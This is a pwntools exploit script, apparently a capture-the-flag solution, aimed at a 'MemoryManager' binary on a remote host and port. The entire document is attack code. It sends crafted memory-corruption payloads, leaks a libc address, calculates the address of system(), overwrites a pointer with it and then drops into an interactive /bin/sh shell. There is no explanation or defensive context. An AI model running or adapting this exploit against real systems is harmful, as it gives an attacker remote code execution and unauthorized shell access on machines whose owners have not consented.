from pwn import *

e = ELF('./MemoryManager')
#p = process(e.path)
p = remote('39.115.110.8', 5859)

main = 0x402372

pay = p8(1) + p16(0x28) + p64(-0x1060 & 0xffffffffffffffff) + p8(0x8)
pay += p8(8) + p16(0x10)
pay += p8(0) + p16(0x21) + p16(0x48) + p64(main) + p8(0) + p8(8)
pay += p8(3) + p16(0x28) + p16(0x28) + p64(0) + p8(8) + p64(-0x1090 & 0xffffffffffffffff) + p8(8)
pay += p8(0xa)
pause()
p.sendafter('> ', '/bin/sh')
p.sendlineafter('> ', pay)
p.recvuntil('[4088]: ')
libc = int(p.recvline()) - 0x1ec6a0
system = libc + 0x55410

pay = p8(0) + p16(0x21) + p16(0x48) + p64(system) + p8(0) + p8(8)
pay += p8(3) + p16(0x28) + p16(0x28) + p64(0) + p8(8) + p64(-0x10C8 & 0xffffffffffffffff) + p8(8)
pay += p8(9)
p.sendafter('> ', '/bin/sh')
p.sendlineafter('> ', pay)

p.interactive()